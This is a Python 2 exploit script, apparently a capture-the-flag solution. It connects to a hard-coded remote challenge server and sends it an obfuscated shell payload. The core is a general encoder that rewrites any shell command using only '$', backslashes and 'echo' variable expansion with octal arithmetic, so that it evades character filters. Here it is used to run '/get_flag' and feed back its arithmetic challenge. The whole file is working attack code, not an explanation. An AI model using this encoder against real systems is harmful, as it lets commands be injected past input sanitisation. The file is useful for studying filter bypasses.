import socket

class gsocket(object):
    def __init__(self, *p):
        self._sock = socket.socket(*p)

    def __getattr__(self, name):
        return getattr(self._sock, name)

    @staticmethod
    def recvive_until(sock, txt):
        d = ""
        while d.find(txt) == -1:
            try:
                dnow = sock.recv(1)
                if len(dnow) == 0:
                    return "DISCONNECTED", d
            except socket.timeout:
                return "TIMEOUT", d
            except socket.error as ex:
                return "ERROR: " + ex.message, d
            d += dnow
        return "OK", d

    def recvuntil(self, txt):
        err, ret = self.recvive_until(self._sock, txt)
        if err != "OK":
            return False
        return ret

    def recvalllines(self):
        ret = ''
        while True:
            line = self.recvuntil('\n')
            if line is False:
                break
            ret += line
        return ret


v_8  = r' $$'
v_10 = r'\$\$'
v_11 = r'\\$\\$'
eq   = r'\$echoecho'
plus = r'\$echoecho'
obr  = r'\$echoechoecho'
zbr  = r'\$echoechoechoecho'
dol  = r'\$echoechoechoechoecho'
amp  = r'\$echoechoechoechoechoecho'
bsl  = r'\$echoechoechoechoechoechoecho'


def ascii_to_fancy(c):
    fancy = ''
    num = int(oct(ord(c)))

    # fancy += $$
    while num % 10 > num // 10:
        fancy += v_8 + plus
        num -= 8
        if num < 0:
            print "Unable to convert {} to fancy format".format(int(oct(ord(c))))
            exit(1)
    # fancy += \$\$
    while num % 10 != 0:
        fancy += v_11 + plus
        num -= 11

    # fancy += \\$\\$
    while num != 0:
        fancy += v_10+  plus
        num -= 10

    if fancy.endswith(plus):
        fancy = fancy[:-1 * len(plus)]

    #       (0...x)   (0...y)  (0...z)   x+y+z >= 1
    # fancy = $$       \$\$     \\$\\$

    # fancy = $((fancy))
    fancy = dol + obr + obr + fancy + zbr + zbr
    # fancy = \$'fancy'
    fancy = bsl + dol + bsl + amp + bsl + bsl + fancy + bsl + amp

    return fancy


def command_to_fancy(command):
    fancy = r'echoecho=\=;' \
            r'echo ' \
            r'echoecho$echoecho\\\+ ' \
            r'echoechoecho$echoecho\\\( ' \
            r'echoechoechoecho$echoecho\\\) ' \
            r'echoechoechoechoecho$echoecho\$ ' \
            r'echoechoechoechoechoecho$echoecho\\\' ' \
            r'echoechoechoechoechoechoecho$echoecho\\\\' \
            r'\; ' \
            r'echo echo echo '
    for c in command:
        if c is ' ':
            fancy += c
        else:
            fancy += ascii_to_fancy(c)
    return fancy


def go():
    sock = gsocket(socket.AF_INET, socket.SOCK_STREAM)

    sock.connect(("35.246.181.187", 1337))
    #sock.connect(("localhost", 1337))

    sock.recvuntil(r"(make sure to try 'thisfile')")

    payload = command_to_fancy(r"bash -c 'expr $(grep + tmp/a)'|/get_flag>tmp/a;cat tmp/a")
    #payload = command_to_fancy(r"/get_flag")
    reps = 3

    print("Sending: \n" + payload)
    sock.sendall(payload + '\n' + str(reps) + '\n')
    print sock.recvalllines()

    sock.close()

go()



